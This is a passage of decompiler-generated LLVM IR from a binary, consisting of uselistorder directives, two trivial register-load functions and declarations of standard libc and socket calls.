680, 679, 258, 259, 831, 682, 260, 683, 150, 684, 291, 685, 244, 156, 686, 316, 687, 336, 688, 252, 689, 237, 430, 982, 983, 431, 1120, 1121, 798, 799, 800, 801, 802, 803, 472, 804, 805, 350, 470, 471, 806, 473, 807, 474, 808, 469, 809, 697, 696, 695, 694, 693, 692, 691, 690, 478, 475, 476, 477, 479, 480, 701, 700, 699, 698, 810, 811, 505, 702, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 703, 507, 506, 704, 705, 842, 481, 482, 483, 712, 508, 711, 710, 709, 708, 707, 706, 843, 844, 484, 485, 721, 720, 719, 509, 718, 717, 716, 715, 714, 713, 847, 379, 420, 486, 487, 726, 725, 724, 723, 722, 143, 141, 142, 728, 727, 432, 855, 348, 349, 856, 857, 858, 732, 731, 730, 729, 859, 733, 860, 734, 861, 736, 735, 737, 862, 738, 1111, 1112, 488, 1113, 1114, 1115, 489, 355, 1116, 490, 1117, 491, 745, 744, 743, 742, 741, 740, 739, 184, 848, 492, 849, 407, 746, 403, 854, 747, 493, 812, 494, 813, 495, 496, 756, 755, 754, 753, 752, 751, 750, 749, 748, 814, 815, 816, 757, 759, 758, 408, 1122, 404, 1118, 9, 1119, 761, 760, 764, 763, 762, 434, 832, 833, 433, 834, 835, 435, 436, 836, 837, 765, 766, 767, 343, 344, 342 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @function_14b28() local_unnamed_addr {
dec_label_pc_14b28:
  %v5_14b2c = load i32, i32* @r0, align 4
  ret i32 %v5_14b2c

; uselistorder directives
  uselistorder i32* @r0, { 8, 122, 123, 124, 125, 35, 126, 127, 128, 129, 130, 133, 131, 132, 32, 52, 53, 54, 55, 56, 57, 58, 134, 135, 7, 136, 137, 138, 139, 140, 94, 141, 142, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 66, 67, 68, 69, 24, 21, 143, 37, 165, 167, 168, 169, 170, 171, 172, 173, 17, 174, 175, 176, 39, 42, 38, 241, 242, 243, 43, 244, 31, 44, 45, 245, 246, 48, 49, 50, 51, 19, 9, 25, 26, 46, 247, 248, 112, 30, 59, 60, 61, 11, 104, 105, 106, 107, 108, 109, 110, 238, 239, 23, 28, 178, 29, 177, 179, 180, 181, 14, 12, 33, 182, 183, 184, 185, 186, 20, 47, 187, 36, 188, 189, 191, 192, 193, 194, 195, 196, 18, 197, 198, 199, 200, 201, 202, 144, 95, 203, 204, 205, 3, 27, 206, 207, 4, 6, 0, 1, 208, 209, 5, 210, 211, 212, 13, 213, 214, 215, 2, 216, 217, 62, 190, 63, 64, 65, 249, 250, 218, 219, 220, 221, 222, 223, 96, 97, 98, 99, 100, 101, 102, 103, 224, 225, 22, 226, 227, 228, 229, 230, 231, 16, 166, 34, 240, 15, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 86, 87, 88, 89, 90, 91, 92, 93, 111, 113, 114, 115, 116, 117, 118, 119, 120, 121, 232, 233, 234, 235, 81, 85, 82, 84, 83, 236, 237, 10, 40, 41 }
}

define i32 @function_14b30() local_unnamed_addr {
entry:
  %v3_14b34 = load i32, i32* @r4, align 4
  %v0_14b3c = call i32 @function_80b0()
  call void @__pseudo_branch(i32 %v3_14b34)
  ret i32 %v0_14b3c

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 0, 13, 5, 6, 7, 9, 18, 19, 15, 16, 17, 2, 20, 11, 8, 4, 10, 12, 3, 1, 14 }
  uselistorder i32 0, {}
  uselistorder i32* @r4, { 45, 537, 188, 5, 189, 190, 4, 191, 192, 193, 11, 194, 10, 195, 196, 197, 198, 199, 200, 203, 206, 207, 208, 209, 210, 201, 202, 204, 205, 12, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 226, 225, 227, 228, 229, 230, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 13, 15, 59, 14, 60, 61, 62, 63, 231, 232, 233, 234, 2, 235, 236, 237, 238, 239, 240, 241, 244, 242, 243, 37, 245, 246, 247, 248, 249, 250, 251, 16, 252, 253, 254, 255, 256, 257, 17, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 129, 130, 541, 542, 545, 546, 282, 284, 283, 286, 285, 7, 291, 287, 292, 6, 313, 314, 315, 316, 317, 318, 18, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 88, 89, 90, 91, 92, 93, 331, 332, 333, 334, 335, 336, 337, 547, 548, 338, 339, 340, 341, 342, 343, 344, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 293, 294, 295, 296, 297, 298, 299, 19, 300, 301, 345, 346, 347, 348, 349, 350, 351, 20, 352, 353, 354, 355, 21, 356, 357, 358, 22, 359, 360, 361, 362, 363, 364, 8, 365, 0, 366, 367, 23, 368, 369, 370, 371, 372, 131, 132, 133, 134, 135, 373, 1, 136, 137, 565, 566, 9, 374, 375, 138, 139, 157, 567, 568, 569, 570, 571, 572, 140, 141, 142, 573, 574, 24, 575, 576, 577, 578, 590, 591, 592, 593, 41, 601, 38, 585, 586, 587, 588, 589, 579, 580, 581, 158, 159, 160, 161, 162, 163, 164, 165, 582, 583, 176, 177, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 166, 167, 168, 169, 170, 532, 533, 171, 172, 173, 534, 535, 536, 584, 376, 377, 378, 379, 25, 26, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 107, 108, 178, 179, 395, 396, 111, 112, 397, 398, 113, 114, 115, 116, 399, 400, 401, 402, 403, 27, 404, 405, 406, 407, 408, 409, 594, 595, 596, 288, 289, 290, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 28, 428, 429, 430, 302, 303, 304, 305, 306, 307, 308, 309, 431, 434, 435, 436, 437, 438, 439, 440, 441, 442, 310, 29, 311, 312, 143, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 463, 462, 464, 465, 466, 467, 468, 469, 470, 30, 471, 472, 473, 479, 480, 481, 482, 3, 483, 484, 485, 486, 487, 488, 489, 31, 490, 32, 491, 492, 493, 494, 75, 76, 77, 474, 476, 475, 477, 478, 432, 433, 78, 42, 79, 80, 81, 82, 83, 84, 85, 86, 39, 87, 597, 598, 599, 600, 495, 496, 497, 498, 499, 500, 501, 33, 502, 34, 503, 504, 505, 506, 507, 508, 509, 43, 144, 40, 145, 146, 147, 148, 149, 150, 151, 152, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 35, 36, 521, 522, 523, 524, 180, 181, 117, 118, 539, 540, 94, 95, 543, 544, 525, 526, 527, 528, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 109, 110, 125, 126, 127, 128, 174, 175, 182, 183, 184, 185, 186, 187, 529, 530, 531, 119, 120, 121, 122, 123, 124, 153, 154, 155, 156, 44, 538 }
}

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
